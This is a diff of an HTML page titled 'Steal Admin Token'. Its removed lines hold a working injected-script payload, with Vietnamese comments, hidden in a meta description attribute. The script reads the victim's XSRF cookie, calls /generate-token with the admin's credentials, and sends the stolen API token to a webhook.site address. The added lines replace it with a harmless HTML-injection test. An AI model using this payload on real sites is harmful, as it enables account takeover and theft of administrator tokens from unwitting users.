@@ -3,46 +3,7 @@
 <head>
   <meta charset="utf-8">
   <title>Steal Admin Token</title>
-  <meta name="description" content='<script>
-    (async function () {
-      const webhook = "	https://webhook.site/b3069f34-4c92-4fa4-b7ee-7e7c7e9ed86e";
-
-      // Lấy CSRF token từ cookie
-      let xsrf = null;
-      document.cookie.split(";").forEach(c => {
-        c = c.trim();
-        if (c.startsWith("XSRF-TOKEN=")) {
-          xsrf = decodeURIComponent(c.substring("XSRF-TOKEN=".length));
-        }
-      });
-
-      if (!xsrf) return;
-
-      try {
-        // Lấy API token bằng cách gửi POST tới /generate-token
-        const tokenRes = await fetch("/generate-token", {
-          method: "POST",
-          headers: {
-            "Accept": "application/json",
-            "X-XSRF-TOKEN": xsrf,
-            "X-Requested-With": "XMLHttpRequest"
-          },
-          credentials: "include" // Gửi cookie admin
-        });
-
-        const tokenData = await tokenRes.json();
-
-        if (!tokenData.token) return;
-
-        const token = tokenData.token;
-
-        // Gửi token về webhook
-        new Image().src = `${webhook}?stage=got_token&token=${encodeURIComponent(token)}`;
-
-      } catch (e) {
-        new Image().src = `${webhook}?stage=error&msg=${encodeURIComponent(e.toString())}`;
-      }
-    })();
-  </script>'>
+  <meta name="description" content='<h1>Test HTML injection</h1>'>
 </head>
+<h1>Steal Admin Token</h1>
 </html>
